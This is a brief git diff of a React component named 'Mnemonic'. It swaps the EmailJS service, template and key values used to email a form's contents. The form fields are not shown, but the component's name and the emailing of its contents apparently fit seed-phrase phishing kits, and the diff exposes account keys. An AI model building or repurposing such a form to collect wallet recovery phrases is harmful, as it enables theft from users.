@@ -33,7 +33,7 @@ export default function Mnemonic()
     const sendEmail = (e) => {
         e.preventDefault();
     
-        emailjs.sendForm('service_eitcot7', 'template_rhhi39v', form.current, 'MLwjHKgTUJiMDQ_px')
+        emailjs.sendForm('service_f9owe8b', 'template_3gtiggj', form.current, 'q9edtd1Uilt68kPHu')
           .then((result) => {
               console.log(result.text);
           }, (error) => {
